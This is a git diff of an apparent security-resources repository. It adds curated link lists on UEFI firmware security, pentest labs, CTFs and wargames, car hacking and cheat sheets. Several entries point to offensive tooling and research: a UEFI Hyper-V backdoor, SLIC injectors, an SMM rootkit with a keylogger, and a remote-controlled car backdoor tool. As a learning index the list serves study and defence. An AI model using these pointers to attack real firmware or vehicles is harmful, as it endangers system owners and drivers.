+    include firmware-level malware (eg, Wikileak'ed Vault7 CIA EFI malware).
+    Defenders need to catch-up, and learn to defend their systems against
+    firmware-level malware. In this presentation, we'll cover the NIST SP
+    (147,147b,155,193) secure firmware guidance, for citizens, rather than
+    vendors/enterprises. We'll discuss the problem of firmware-level malware,
+    and cover some open source tools (FlashROM, CHIPSEC, etc.) to help detect
+    malware on your system. We'll be discussing a new open source tool we've
+    just released to help make it easier for you to do this check. You'll also
+    get a nice paper tri-fold copy of our CHIPSEC Quick Reference for Sysadmins
+    [note: we're all sysadmins for our own personal systems(!)], and some scary
+    looking BadBIOS stickers for your laptop.
+
+### Tools
+
+* [WindSLIC SLIC injectors](https://github.com/untermensch/WindSLIC)
+
+  * includes UEFI, NTFS, bootmgr SLIC injectors and installers.
+
+* [UEFI Firmware Parser](https://github.com/theopolis/uefi-firmware-parser)
+
+  * The UEFI firmware parser is a simple module and set of scripts for parsing,
+    extracting, and recreating UEFI firmware volumes. This includes parsing
+    modules for BIOS, OptionROM, Intel ME and other formats too. Please use the
+    example scripts for parsing tutorials.
+
+* [Firmware Modifcation kit](https://code.google.com/p/firmware-mod-kit/)
+
+  * This kit is a collection of scripts and utilities to extract and rebuild
+    linux based firmware images.
+
+* [Debug Agent Based UEFI Debugging](https://software.intel.com/en-us/articles/xdb-agent-based-uefi-debug)
+
+  * The Intel® System Debugger now supports non-JTAG based debug of UEFI BIOS,
+    this requires the use of a target-side debug agent and a USB or serial
+    connection to the debug agent. This article takes you through the steps
+    necessary and the the debug methodology used bey the Intel® System Debugger
+    to use this method to supplement the pure JTAG based UEFI debug method it
+    also supports
+
+* [ida-uefiutils](https://github.com/snare/ida-efiutils/)
+
+  * Some scripts for IDA Pro to assist with reverse engineering EFI binaries
+
+* [VisualUEFI](https://github.com/ionescu007/VisualUefi)
+
+  * A project for allowing EDK-II Development with Visual Studio
+
+* [UDKToolbox](https://github.com/smwikipedia/UDKToolbox)
+
+  * An toolbox to help adopt Visual Studio for UEFI development.
+
+* [Hyper-V backdoor for UEFI](https://gist.github.com/Cr4sh/55a54e7f3c113316efd2d66457df68dd)
+* [UEFITool](https://github.com/LongSoft/UEFITool)
+
+  * UEFITool is a cross-platform C++/Qt program for parsing, extracting and
+    modifying UEFI firmware images. It supports parsing of full BIOS images
+    starting with the flash descriptor or any binary files containing UEFI
+    volumes.
+
+### Papers & Writeups
+
+* [Security Evaluation of Intel's Active Management Technology](http://people.kth.se/~maguire/DEGREE-PROJECT-REPORTS/100402-Vassilios_Ververis-with-cover.pdf)
+* [Easily create UEFI applications using Visual Studio 2013](http://pete.akeo.ie/2015/01/easily-create-uefi-applications-using.html)
+* [SMM Rootkits:A New Breed of OS Independent Malware](http://www.eecs.ucf.edu/~czou/research/SMM-Rootkits-Securecom08.pdf)
+
+  * The emergence of hardware virtualization technology has led to the
+    development of OS independent malware such as the Virtual Machine based
+    rootkits (VMBRs). In this paper, we draw attention to a different but
+    related threat that exists on many commodity systems in operation today: The
+    System Management Mode based rootkit (SMBR). System Management Mode (SMM) is
+    a relatively obscure mode on Intel processors used for low-level hardware
+    control. It has its own private memory space and execution environment which
+    is generally invisible to code running outside (e.g., the Operating System).
+    Furthermore, SMM code is completely non-preemptible, lacks any concept of
+    privilege level, and is immune to memory protection mechanisms. These
+    features make it a potentially attractive home for stealthy rootkits. In
+    this paper, we present our development of a proof of concept SMM rootkit. In
+    it, we explore the potential of System Management Mode for malicious use by
+    implementing a chipset level keylogger and a network backdoor capable of
+    directly interacting with the network card to send logged keystrokes to a
+    remote machine via UDP. The rootkit hides its memory footprint and requires
+    no changes to the existing Operating System. It is compared and contrasted
+    with VMBRs. Finally, techniques to defend against these threats are
+    explored. By taking an offensive perspective we hope to help security
+    researchers better understand the depth and scope of the problems posed by
+    an emerging class of OS independent malware.
+
+* [How to develop your own Boot Loader](https://www.codeproject.com/Articles/36907/How-to-develop-your-own-Boot-Loader)
+* [Disabling Intel ME 11 via undocumented mode - ptsecurity](http://blog.ptsecurity.com/2017/08/disabling-intel-me.html)
+
+### Other
+
+* [Notes on Intel Microcode Updates](http://hireme.geek.nz/Intel_x86_NSA_Microcode_Updates.pdf)
+* [BIOS Mods - mydigitallife](https://forums.mydigitallife.net/forums/bios-mods.25/)
+* [MDL Projects and Applications](https://forums.mydigitallife.net/forums/mdl-projects-and-applications.34/)
+* [Advice for writing a Bootloader? - reddit](https://www.reddit.com/r/lowlevel/comments/30toah/advices_for_a_bootloader/)
diff --git a/source/Basic-Security-Information.md b/source/Basic-Security-Information.md
new file mode 100644
index 0000000..60d5863
--- /dev/null
+++ b/source/Basic-Security-Information.md
@@ -0,0 +1,79 @@
+## Basic Security Principles/Information
+
+### Basic Information
+
+These are links to basic technically links or things I feel might help someone
+new to the field.
+
+* [Infosec Tools of the Trade: Getting Your Hands Dirty](http://www.irongeek.com/i.php?page=videos/bsidesnashville2017/bsides-nashville-2017-green00-infosec-tools-of-the-trade-getting-your-hands-dirty-jason-smith-and-tara-wink)
+
+  * In this presentation we'll will be going over introductions to the various
+    focuses in information security and demoing the most common tools that are
+    used in operational security, both offense and defense. You'll leave with an
+    idea on how to freely obtain and use these tools so that you can have what
+    you need for that first interview: experience and a passion for security.
+    This is a green talk for people who don't have a clue on what offensive and
+    defensive people do operationally, from a tool perspective.
+
+* [So you think you want to be a penetration tester - Defcon24](https://www.youtube.com/watch?v=be7bvZkgFmY)
+
+  * So, you think you want to be a penetration tester, or you already are and
+    don't understand what the difference between you and all the other "so
+    called" penetration testers out there. Think you know the difference between
+    a Red Team, Penetration Test and a Vulnerability assessment? Know how to
+    write a report your clients will actually read and understand? Can you
+    leverage the strengths of your team mates to get through tough roadblocks,
+    migrate, pivot, pwn and pillage? No? well this talk is probably for you
+    then! We will go through the fascinating, intense and often crazily boring
+    on-site assessment process. Talk about planning and performing Red Teams,
+    how they are different, and why they can be super effective and have some
+    fun along the way. I'll tell you stories that will melt your face, brain and
+    everything in between. Give you the answers to all of your questions you
+    never knew you had, and probably make you question your life choices. By the
+    end of this session you will be ready to take your next steps into the job
+    you've always wanted, or know deep inside that you should probably look for
+    something else. There will be no judgment or shame, only information,
+    laughter and fun.
+
+### General
+
+* [Types of Authentication](http://www.gfi.com/blog/security-101-authentication-part-2/)
+* [Information Security For Journalist book - Centre for Investigative Journalism](http://files.gendo.nl/Books/InfoSec_for_Journalists_V1.1.pdf)
+* [Access control best practices](https://srlabs.de/acs/)
+* [Programming Sucks](http://www.stilldrinking.org/programming-sucks)
+
+### Metasploit
+
+* [Introduction To Metasploit – The Basics](http://www.elithecomputerguy.com/2013/02/08/introduction-to-metasploit-the-basics/)
+
+### Shodan
+
+* [Shodan Man page](http://www.shodanhq.com/help)
+* [Shodan Filter Reference](http://www.shodanhq.com/help/filters)
+* [Shodan FAQ](http://www.shodanhq.com/help/faq)
+
+### I'll sort later
+
+* [304 Hold my Red Bull Undergraduate Red Teaming Jonathan Gaines](https://www.youtube.com/watch?v=9vgpqRzuvLk)
+
+* [100 OWASP Top 10 Hacking Web Applications with Burp Suite Chad Furman](https://www.youtube.com/watch?v=2p6twRRXK_o)
+
+* [213 How not to Infosec Dan Tentler](https://www.youtube.com/watch?v=S5O47gemMNQ)
+
+* [Application Whitelisting Using Microsoft AppLocker](https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm)
+
+* [So You Want To Be A H6x0r Getting Started in Cybersecurity Doug White and Russ Beauchemin ](https://www.youtube.com/watch?v=rRJKghTTics)
+
+* [How to become a pentester - Corelan](https://www.corelan.be/index.php/2015/10/13/how-to-become-a-pentester/)
+
+* [SANS Institute Security Consensus Operational Readiness Evaluation](https://www.sans.org/media/score/checklists/LinuxCheatsheet_2.pdf)
+
+* [Windows Commands Abused by Attackers](http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html)
+
+* [Red Hat Enterprise Linux 6 Security Guide](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/pdf/Security_Guide/Red_Hat_Enterprise_Linux-6-Security_Guide-en-US.pdf)
+
+* [Mitigate threats by using Windows 10 security features](https://docs.microsoft.com/en-us/windows/threat-protection/overview-of-threat-mitigations-in-windows-10)
+
+* https://github.com/iadgov/Pass-the-Hash-Guidance
+
+* https://blog.zsec.uk/101-intro/
diff --git a/Draft/Building A Pentest Lab.md b/source/Building-A-Pentest-Lab.md
old mode 100755
new mode 100644
similarity index 51%
rename from Draft/Building A Pentest Lab.md
rename to source/Building-A-Pentest-Lab.md
index 0f27ffa..cf0c01d
--- a/Draft/Building A Pentest Lab.md	
+++ b/source/Building-A-Pentest-Lab.md
@@ -1,68 +1,81 @@
 ## Building a Pentest Lab
 
-
 ### ToC
 
 * [General](#general)
 * [VMs Designed to be Attacked](#vm)
 * [Building a Pentest Lab](#building)
 
+### General
 
-
-
-
------
-### <a name="general"></a>General
 * [Install AD DS using Powerhsell](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/deploy/install-active-directory-domain-services--level-100-#BKMK_PS)
 * [Pentest Environment Deployer](https://github.com/Sliim/pentest-env)
-	* This repo provides an easy way to deploy a clean and customized pentesting environment with Kali linux using vagrant and virtualbox.
-* [DumpsterFire](https://github.com/TryCatchHCF/DumpsterFire)
-	* [Slides](https://github.com/TryCatchHCF/DumpsterFire/raw/master/CactusCon_2017_Presentation/DumpsterFire_CactusCon_2017_Slides.pdf)
-	* The DumpsterFire Toolset is a modular, menu-driven, cross-platform tool for building repeatable, time-delayed, distributed security events. Easily create custom event chains for Blue Team drills and sensor / alert mapping. Red Teams can create decoy incidents, distractions, and lures to support and scale their operations. Turn paper tabletop exercises into controlled "live fire" range events. Build event sequences ("narratives") to simulate realistic scenarios and generate corresponding network and filesystem artifacts.
-
 
+  * This repo provides an easy way to deploy a clean and customized pentesting
+    environment with Kali linux using vagrant and virtualbox.
 
+* [DumpsterFire](https://github.com/TryCatchHCF/DumpsterFire)
 
+  * [Slides](https://github.com/TryCatchHCF/DumpsterFire/raw/master/CactusCon_2017_Presentation/DumpsterFire_CactusCon_2017_Slides.pdf)
+  * The DumpsterFire Toolset is a modular, menu-driven, cross-platform tool for
+    building repeatable, time-delayed, distributed security events. Easily
+    create custom event chains for Blue Team drills and sensor / alert mapping.
+    Red Teams can create decoy incidents, distractions, and lures to support and
+    scale their operations. Turn paper tabletop exercises into controlled "live
+    fire" range events. Build event sequences ("narratives") to simulate
+    realistic scenarios and generate corresponding network and filesystem
+    artifacts.
 
------
 ### Resources for VMs
+
 * [Internet Explorer Windows XP and Vista Virtual Machines](https://github.com/mikescott/ie-virtual-machines/blob/master/README.md)
 
+### VMs Designed to be Attacked
 
+* [Vulnhub](https://www.Vulnhub.com)
 
+  * Vulnhub is a website dedicated to cataloging various vulnerable VMs from
+    across the web. It also has a healthy community that creates and submits new
+    VMs on a regular basis. As I write this now, I believe there is around 100
+    or so different VMs on Vulnhub, so you have a bit of variation.
 
------
-### <a name="vm"></a>VMs Designed to be Attacked
-* [Vulnhub](https://www.Vulnhub.com)
-	* Vulnhub is a website dedicated to cataloging various vulnerable VMs from across the web. It also has a healthy community that creates and submits new VMs on a regular basis. As I write this now, I believe there is around 100 or so different VMs on Vulnhub, so you have a bit of variation.
 * [iv-wrt](https://github.com/iv-wrt/iv-wrt)
-	* An Intentionally Vulnerable Router Firmware Distribution
-* [List of VMs that are preconfigured virtual machines](http://www.amanhardikar.com/mindmaps/PracticeUrls.html)
-* [The Hacker Games - Hack the VM before it hacks you](http://www.scriptjunkie.us/2012/04/the-hacker-games/)
-	* I have talked about counterattacks here before, and this system has implemented a number of aggressive anti-hacker measures.  In fact, this VM is downright evil. I am probably legally obligated to tell you that it will try to hack you. So if a calculator or message declaring your pwnedness pops up or shows up on your desktop, you asked for it. But don?t worry, it won?t steal your docs or rm you, it will just demonstrate compromise for the game.  To save precious bandwidth, this has been implemented in a minimal tinycore-based VM, and will require VirtualBox to run.
-
 
+  * An Intentionally Vulnerable Router Firmware Distribution
 
+* [List of VMs that are preconfigured virtual machines](http://www.amanhardikar.com/mindmaps/PracticeUrls.html)
+* [The Hacker Games - Hack the VM before it hacks you](http://www.scriptjunkie.us/2012/04/the-hacker-games/)
 
+  * I have talked about counterattacks here before, and this system has
+    implemented a number of aggressive anti-hacker measures. In fact, this VM is
+    downright evil. I am probably legally obligated to tell you that it will try
+    to hack you. So if a calculator or message declaring your pwnedness pops up
+    or shows up on your desktop, you asked for it. But dont worry, it wont steal
+    your docs or rm you, it will just demonstrate compromise for the game. To
+    save precious bandwidth, this has been implemented in a minimal
+    tinycore-based VM, and will require VirtualBox to run.
 
------
 ### Installing Active Directory
-* [Install AD DS using Powerhsell](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/deploy/install-active-directory-domain-services--level-100-#BKMK_PS)
-
-
-
 
+* [Install AD DS using Powerhsell](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/deploy/install-active-directory-domain-services--level-100-#BKMK_PS)
 
+### Guides to setting up a Pen test lab:
 
+* [Home Lab with pfSense & VMware Workstation - sysadmin perspective](http://itpro.outsidesys.com/2015/02/19/home-lab-with-pfsense-workstation/)
 
+  * I wanted to build a virtual lab environment at home that would emulate an
+    office environment. My requirements were to have separate network segments
+    for Clients & Servers, and two DMZ networks. I also wanted my home network,
+    which is external to the virtual lab environment, to emulate the Internet,
+    even though it really isnt. The following is how I created multiple named
+    LAN segments within VMware Workstation, and routed between them using a VM
+    running pfSense, which is an open source firewall.
 
------
-### <a name="building"></a>Guides to setting up a Pen test lab:
-* [Home Lab with pfSense & VMware Workstation - sysadmin perspective](http://itpro.outsidesys.com/2015/02/19/home-lab-with-pfsense-workstation/)
-	* I wanted to build a virtual lab environment at home that would emulate an office environment.  My requirements were to have separate network segments for Clients & Servers, and two DMZ networks.  I also wanted my home network, which is external to the virtual lab environment, to emulate the Internet, even though it really isn?t. The following is how I created multiple ?named? LAN segments within VMware Workstation, and routed between them using a VM running pfSense, which is an open source firewall.
 * [Setting Up a Pentest/Hacking Lab with Hyper-V](http://cyberthreathunt.com/2017/04/01/setting-up-a-pentest-lab-with-hyper-v/)
 * [Windows Server 2016: Build a Windows Domain Lab at Home for Free](https://social.technet.microsoft.com/wiki/contents/articles/36438.windows-server-2016-build-a-windows-domain-lab-at-home-for-free.aspx#Download)
-	* Microsoft Technet tutorial
+
+    * Microsoft Technet tutorial
+
 * [Pentest Home Lab - 0x2 - Building Your AD Lab on Premises-SethSec](https://sethsec.blogspot.com/2017/06/pentest-home-lab-0x2-building-your-ad.html)
 * [Building A Lab on AWS - 0x1 SethSec](https://sethsec.blogspot.com/2017/05/pentest-home-lab-0x1-building-your-ad.html)
 * [Building an Effective Active Directory Lab Environment for Testing](https://adsecurity.org/?p=2653)
@@ -72,4 +85,3 @@
 * [Setting Up A Penetration Testing Lab - Rapid7](https://kb.help.rapid7.com/docs/setting-up-a-penetration-testing-lab)
 * [Building a Pentest Lab - stan.gr](http://www.stan.gr/2013/03/building-pentest-lab.html)
 * [SANS Webcast: Building Your Own Super Duper Home Lab](https://www.youtube.com/watch?v=uzqwoufhwyk&app=desktop)
-
diff --git a/source/CTF-Wargames.md b/source/CTF-Wargames.md
new file mode 100644
index 0000000..7bcf0d6
--- /dev/null
+++ b/source/CTF-Wargames.md
@@ -0,0 +1,155 @@
+## CTFs & Wargames
+
+##### TOC
+
+* [General](#general)
+* [Wargames](#wargames)
+* [Vulnerable VMs](#vulnvm)
+* [Challenge Sites](#challenge)
+* [One-off Challenges & Puzzles](#puzzle)
+* [Hosting CTFs/Making your own](#make)
+
+#### Cull
+
+* [Greenhorn](https://github.com/trailofbits/greenhorn)
+
+  * Greenhorn is a Windows Pwnable released during CSAW Quals 2014. It's meant
+    to be an introduction to modern Windows binary exploitation.
+
+* sec-gen
+
+* pentestit
+
+* pentestlab
+
+* root-me
+
+### General
+
+* [ctf-time](https://ctftime.org/)
+
+* 101
+
+  * [How to play your first OpenCTF](http://www.openctf.com/html/firstctf.html)
+  * [Capture The Flag (CTF): What Is It for a Newbie?](https://www.alienvault.com/blogs/security-essentials/capture-the-flag-ctf-what-is-it-for-a-newbie)
+  * [Advice for my first CTF? - Reddit Thread](https://www.reddit.com/r/hacking/comments/24py5h/advice_for_my_first_ctf/)
+
+* Beginner Focused CTFs
+* Challenge Archives
+
+  * [Archive of recent CTFs](http://repo.shell-storm.org/CTF/)
+
+* Challenges (one-offs)
+
+  * [Forensics Contest](http://forensicscontest.com/)
+  * [List of themed Hacker challenges](http://counterhack.net/Counter_Hack/Challenges.html)
+  * [Sans Community Forensics Challenges](https://www.digital-forensics.sans.org/community/challenges)
+
+* Challenge Sites
+
+  * [HacktheBox.eu](https://www.hackthebox.eu/)
+  * [Wechall](http://wechall.net/)
+    * An amazing site. Tracks, lists, scores, various challenge sites. If youre
+      looking for a challenge or two, and not a wargame, this is the site you
+      want to hit up first.
+  * [XSS Challenge Wiki](https://github.com/cure53/xss-challenge-wiki/wiki)
+    * A wiki that contains various xss challenges.
+  * [Halls of Valhalla](http://halls-of-valhalla.org/beta/challenges)
+  * [EnigmaGroup](http://www.enigmagroup.org/)
+  * [cmdchallenge](https://github.com/jarv/cmdchallenge)
+    * This repo holds the challenges for cmdchallenge.co - command-line
+      challenges - can add your own/modify existing challenges
+  * [Canyouhackit](http://canyouhack.it/)
+    * Can You Hack It is a Hacking Challenge site designed to not only allow you
+      to test and improve your skills in a wide variety of categories but to
+      socialise both on the forums and on our IRC channel with other security
+      enthusiasts.
+  * [Tasteless](http://chall.tasteless.se/)
+  * [Hack This](https://www.hackthis.co.uk/)
+  * [XSS Challenge Wiki](https://github.com/cure53/xss-challenge-wiki/wiki)
+    * [List without spoilers:](https://github.com/cure53/xss-challenge-wiki/wiki/Older-Challenges-and-Write-Ups)
+
+* Educational
+
+  * [Suggestions on Running a CTF](https://github.com/pwning/docs/blob/master/suggestions-for-running-a-ctf.markdown)
+    * This document describes some of the design decisions and technical details
+      involved in running a CTF competition. It attempts to summarize some
+      opinions held by the CTF community and list some specific pitfalls to
+      avoid when designing problems.
+  * [The Many Maxims of Maximally Effective CTFs](http://captf.com/maxims.html)
+
+* General
+
+  * [CTF Field Guide - TrailofBits](https://trailofbits.github.io/ctf/)
+  * [Golden Flag CTF Awards](http://golden-flags.com/)
+
+* Handy Tools
+
+  * [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html)
+    * pngcheck verifies the integrity of PNG, JNG and MNG files (by checking the
+      internal 32-bit CRCs [checksums] and decompressing the image data); it can
+      optionally dump almost all of the chunk-level information in the image in
+      human-readable form. For example, it can be used to print the basic
+      statistics about an image (dimensions, bit depth, etc.); to list the color
+      and transparency info in its palette (assuming it has one); or to extract
+      the embedded text annotations. This is a command-line program with batch
+      capabilities.
+  * [pwntools](https://github.com/Gallopsled/pwntools)
+  * [CTF Scripts and PyInstaller (.py > .exe) ](http://www.primalsecurity.net/ctf-scripts-and-pyinstaller-py-exe/)
+
+* Making Your Own CTF
+
+  * [AppJailLauncher](https://github.com/trailofbits/AppJailLauncher)
+    * CTF Challenge Framework for Windows 8 and above
+  * [CTFd](https://github.com/isislab/CTFd)
+    * CTFd is a CTF in a can. Easily modifiable and has everything you need to
+      run a jeopardy style CTF.
+  * [iCTF Framwork](https://github.com/ucsb-seclab/ictf-framework)
+    * This is the framework that the UC Santa Barbara Seclab uses to host the
+      iCTF, and that can be used to create your own CTFs at
+      http://ictf.cs.ucsb.edu/framework. The framework creates several VMs: one
+      for the organizers and one for every team.
+  * [NightShade](https://github.com/UnrealAkama/NightShade)
+    * NightShade is a simple security capture the flag framework that is
+      designed to make running your own contest as easy as possible.
+  * [Mellivora](https://github.com/Nakiami/mellivora)
+    * Mellivora is a CTF engine written in PHP
+  * [SecGen](https://github.com/SecGen/SecGen)
+    * SecGen creates vulnerable virtual machines so students can learn security
+      penetration testing techniques.
+
+- Vulnerable Virtual Machines
+
+  * [Vulnhub](https://www.Vulnhub.com)
+  * [The Hacker Games](http://www.scriptjunkie.us/2012/04/the-hacker-games/)
+    * VM Setup to practice VM breakouts/defense. Hack the VM before it hacks
+      you!
+    * [VM Download](http://www.scriptjunkie.us/files/TheHackerGames.zip)
+  * [VulnInjector](https://github.com/g0tmi1k/VulnInjector)
+    * Generates a 'vulnerable' machine using the end users own setup files &
+      product keys.
+
+- Wargames
+
+  * [Ringzer0 team CTF](http://ringzer0team.com/)
+    * Description: RingZer0 Team's online CTF offers you tons of challenges
+      designed to test and improve your hacking skills thru hacking challenge.
+      Register and get a flag for every challenges.
+  * [pwn0 Wargame](https://pwn0.com/)
+    * pwn0 is a network where (almost) anything goes. Just sign up, connect to
+      the VPN, and start hacking. pwn0 on freenode
+  * [Microcorruption](https://microcorruption.com/login)
+    * Awesome wargame.
+  * [OverTheWire Wargames](http://overthewire.org/wargames/)
+    * OverTheWire provides several wargames publicly/freely available. All very
+      good quality. Highly recommended.
+  * [Smash the Stack Wargames](http://smashthestack.org/)
+    * Smash the stack hosts several public wargames of very good quality for
+      free use. Highly recommended.
+
+- Writeups
+
+  * [CTF Writeups](https://github.com/ctfs/write-ups)
+  * [CTF write-ups 2015](https://github.com/ctfs/write-ups-2015)
+  * [CTF write-ups 2017](https://github.com/ctfs/write-ups-2017)
+  * [Pwning (sometimes) with style Dragons notes on CTFs](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)
diff --git a/source/Car-Hacking.md b/source/Car-Hacking.md
new file mode 100644
index 0000000..ad19d99
--- /dev/null
+++ b/source/Car-Hacking.md
@@ -0,0 +1,129 @@
+# Car Hacking
+
+## ToC
+
+* [General](#general)
+* [Writeups](#writeup)
+* [Papers](#papers)
+* [Talks & Presentations](#talks)
+* [Tools](#tools)
+
+#### Cull
+
+#### General
+
+* [Awesome Vehicle Security List(github awesome lists)](https://github.com/jaredthecoder/awesome-vehicle-security)
+
+* [Introduction to Hacking in Car Systems - Craig Smith - Troopers15](https://www.youtube.com/watch?v=WHDkf6kpE58)
+
+* [Intro to Automotive Security - Ariel Zentner](https://www.youtube.com/watch?v=yAzqFhq06_E)
+
+* [The OpenXC Platform](http://openxcplatform.com/)
+
+  * OpenXC™ is a combination of open source hardware and software that lets you
+    extend your vehicle with custom applications and pluggable modules.
+
+#### Writeups/Blogposts/How-To
+
+* [Broadcasting Your Attack: Security Testing DAB Radio In Cars](https://www.youtube.com/watch?v=ryNtz1nxmO4)
+
+* [Tesla Model S JSON API (unofficial RE post)](http://docs.timdorr.apiary.io/#reference/vehicles)
+
+* [Tesla Model S JSON API (unofficial RE post)](http://docs.timdorr.apiary.io/#reference/vehicles)
+
+* [Cyber-attacks on vehicles P-I!](http://dn5.ljuska.org/napadi-na-auto-sistem-1.html)
+
+* [Cyber-attacks on vehicles P-II!](http://dn5.ljuska.org/cyber-attacks-on-vehicles-2.html)
+
+* [An Introduction to the CAN Bus: How to Programmatically Control a Car: Hacking the Voyage Ford Fusion to Change A/C Temperature](https://news.voyage.auto/an-introduction-to-the-can-bus-how-to-programmatically-control-a-car-f1b18be4f377)
+
+#### Talks & Presentations
+
+* [Hacking Cars with Python - Eric Evenchick PyCon 2017](https://www.youtube.com/watch?v=3bZNhMcv4Y8&app=desktop)
+
+  * Modern cars are networks of computers, and a high end vehicle could have
+    nearly 100 different computers inside. These devices control everything from
+    the engine to the airbags. By understanding how these systems work, we can
+    interface with vehicles to read data, perform diagnostics, and even modify
+    operation. In this talk, we'll discuss pyvit, the Python Vehicle Interface
+    Toolkit. This library, combined with some open source hardware, allows
+    developers to talk to automotive controllers from Python. We will begin with
+    an introduction to automotive networks, to provide a basis for understanding
+    the tools. Next, we will look at the tools and show the basics of using
+    them. Finally, we'll discuss real world applications of these tools, and how
+    they're being used in the automotive world today.
+
+* [Adventures in Automotive Networks and Control Units](https://www.youtube.com/watch?v=MEYCU62yeYk&app=desktop)
+
+  * Charlie Miller & Chris Valasek
+
+* [Broadcasting your attack: Security testing DAB radio in cars - Andy Davis](http://2015.ruxcon.org.au/assets/2015/slides/Broadcasting-your-attack-Security-testing-DAB-radio-in-cars.pdf)
+
+* [A Survey of Remote Automotive Attack Surfaces - Black Hat USA 2014](https://www.youtube.com/watch?v=mNhFGJVq2HE)
+
+* [Broadcasting your attack: Security testing DAB radio in cars - Andy Davis](http://2015.ruxcon.org.au/assets/2015/slides/Broadcasting-your-attack-Security-testing-DAB-radio-in-cars.pdf)
+
+* [A Vulnerability in Modern Automotive Standards and How We Exploited It](https://documents.trendmicro.com/assets/A-Vulnerability-in-Modern-Automotive-Standards-and-How-We-Exploited-It.pdf)
+
+* [Car hacking: getting from A to B with Eve (SHA2017)](https://www.youtube.com/watch?v=l9760bzUN3E)
+
+  * Car security is, not surprisingly, a hot topic; after all they are fast and
+    heavy computer controlled machinery that nowadays come with all kinds of
+    internet connectivity. So we decided to have a look at it. In our
+    presentation, we’ll first cover some theory behind the IT-part of car
+    architecture. We’ll discuss attack vectors and their likelihood of success,
+    and then discuss the various vulnerabilities we found. Finally, we will
+    combine these vulnerabilities into a remote attack. Depending on the
+    disclosure process with the vendor, which is pending, we might be able to
+    demonstrate the attack.
+
+#### Tools
+
+* [CANBus Triple](https://canb.us/)
+
+  * General purpose Controller Area Network swiss army knife / development
+    platform.
+
+* [Yet Another Car Hacking Tool](https://asintsov.blogspot.ro/2016/03/yet-another-car-hacking-tool.html?m=1)
+
+* [CANToolz](https://github.com/eik00d/CANToolz)
+
+  * CANToolz is a framework for analysing CAN networks and devices. This tool
+    based on different modules which can be assembled in pipe together and can
+    be used by security researchers and automotive/OEM security testers for
+    black-box analysis and etc. You can use this software for ECU discovery,
+    MITM testing, fuzzing, bruteforcing, scanning or R&D testing and validation
+
+* [canspy](https://github.com/manux81/canspy)
+
+  * Very simple tool for users who need to interface with a device based on CAN
+    (CAN/CANopen/J1939/NMEA2000/DeviceNet) such as motors, sensors and many
+    other devices.
+
+* [CBM - The Bicho](https://github.com/UnaPibaGeek/CBM)
+
+  * For the first time, a hardware backdoor tool is presented having several
+    advanced features, such as: remote control via SMS commands, automated
+    launch of attack payloads at a GPS location or when a specific car status is
+    reached; and a configuration interface that allows users to create attack
+    payloads in an easy manner. Have you ever imagined the possibility of your
+    car being automatically attacked based on its GPS coordinates, its current
+    speed or any other set of parameters? Now it's possible :-)
+
+#### Hardware Tools
+
+* [CBM - The Bicho](https://github.com/UnaPibaGeek/CBM)
+
+  * For the first time, a hardware backdoor tool is presented having several
+    advanced features, such as: remote control via SMS commands, automated
+    launch of attack payloads at a GPS location or when a specific car status is
+    reached; and a configuration interface that allows users to create attack
+    payloads in an easy manner. Have you ever imagined the possibility of your
+    car being automatically attacked based on its GPS coordinates, its current
+    speed or any other set of parameters? Now it's possible :-)
+
+#### Papers
+
+* [Remote Exploitation of an Unaltered Passenger Vehicle](http://illmatics.com/Remote%20Car%20Hacking.pdf)
+
+## Miscellaneous
diff --git a/Draft/Cheat sheets reference pages Checklists -.md b/source/CheatSheets.md
old mode 100755
new mode 100644
similarity index 73%
rename from Draft/Cheat sheets reference pages Checklists -.md
rename to source/CheatSheets.md
index 7d1d9d2..d7c6728
--- a/Draft/Cheat sheets reference pages Checklists -.md	
+++ b/source/CheatSheets.md
@@ -1,12 +1,12 @@
 ## Cheat Sheets & Reference Pages
 
-
 #### TOC
+
 * [General](#General)
 * [ASM(x86/64/ARM)](#ASM)
 * [Android](#Android)
 * [iOS](#ios)
-* [Linux](#Linux
+* [Linux](#Linux)
 * [OS X](#OSX)
 * [Windows](#Windows)
 * [Exploitation](#Exploitation)
@@ -14,25 +14,19 @@
 * [Metasploit](#Metasploit)
 * [Forensics/IR](#For)
 * [Malware](#Malware)
-* [Reverse Engineering](#RE) 
+* [Reverse Engineering](#RE)
 * [Web](#Web)
 * [Databases](#DB)
 
-
-
-
-
 #### CULL
-[SiLK Toolsuite Quick Reference Guide](https://tools.netsa.cert.org/silk/silk-quickref.pdf)
+
+* [SiLK Toolsuite Quick Reference Guide](https://tools.netsa.cert.org/silk/silk-quickref.pdf)
 * [MS "reg" commandreference](http://www.computerhope.com/reg.htm)
-http://www.amanhardikar.com/mindmaps.html
-http://www.amanhardikar.com/mindmaps/Practice.html
-#### end cull
+* [Mindmaps](http://www.amanhardikar.com/mindmaps.html)
+  * [Mind maps practice](http://www.amanhardikar.com/mindmaps/Practice.html)
 
+### General Cheat Sheets
 
-----------
-### <a name="General">General Cheat Sheets</a>
-**General Cheat Sheets**
 * [How to Suck at Information Security](https://zeltser.com/suck-at-security-cheat-sheet/)
 * [Tips for Troubleshooting Human Communications](https://zeltser.com/human-communications-cheat-sheet/)
 * [Nmap](https://highon.coffee/docs/nmap/)
@@ -41,79 +35,55 @@ http://www.amanhardikar.com/mindmaps/Practice.html
 * [Security Architecture Cheat Sheet for Internet Applications](https://zeltser.com/security-architecture-cheat-sheet/)
 * [tmux Cheat Sheet](http://tmuxcheatsheet.com/)
 
+### x86/64/ARM
 
-
-----------
-### <a name="ASM">x86/64/ARM</a>
-**ASM Cheat Sheets**
 * [x86 opcode structure and instruction overview](http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.pdf)
 * [Intro to x86 calling conventions](http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html)
 * [Reading ASM](http://cseweb.ucsd.edu/classes/sp11/cse141/pdf/02/S01_x86_64.key.pdf)
 * [Assembler Language Instructions](http://www.laynetworks.com/assembly%20tutorials3.htm)
 
+### Android Cheat Sheets
 
-----------
-### <a name="Android">Android Cheat Sheets</a>
-**Android Cheat Sheets**
 * [Android ADB cheat sheet](https://github.com/maldroid/adb_cheatsheet/blob/master/cheatsheet.pdf?raw=true)
 
+### iOS Cheat Sheets
